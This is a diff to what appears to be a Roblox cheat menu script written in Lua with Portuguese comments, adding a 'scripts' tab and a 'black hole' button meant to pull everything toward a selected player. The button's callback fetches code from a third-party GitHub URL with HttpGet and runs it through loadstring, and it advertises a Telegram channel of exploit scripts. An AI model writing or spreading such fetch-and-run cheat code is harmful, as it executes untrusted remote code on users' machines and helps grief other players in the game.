@@ -44,6 +44,11 @@ local Tab2 = Window:Tab({
     Icon = "music", -- lucide or rbxassetid
 })
 
+local Tab3 = Window:Tab({
+    Title = "scripts",
+    Icon = "face", -- lucide or rbxassetid
+})
+
 local Button = Tab1:Button({
     Title = "Get couch",
     Desc = "conch",
@@ -441,7 +446,7 @@ local Dropdown = Tab1:Dropdown({
         end
     end
 })
-
+--scripts tab2 abaixo acima somente scripts tab1
 local Paragraph = Tab2:Paragraph({
     Title = "precisa da gamepass",
     Desc = "gamepass música",
@@ -502,6 +507,15 @@ local Button = Tab2:Button({
 }
 
 game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
+    end,
+})
+--scripts tab3 abaixo acima somente scripts tab2
+
+local Button = Tab3:Button({
+    Title = "buraco negro",
+    Desc = "puxa todas a coisas para o plaier selecionado",
+    Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))("More Scripts: t.me/arceusxscripts")
     end,
 })
 
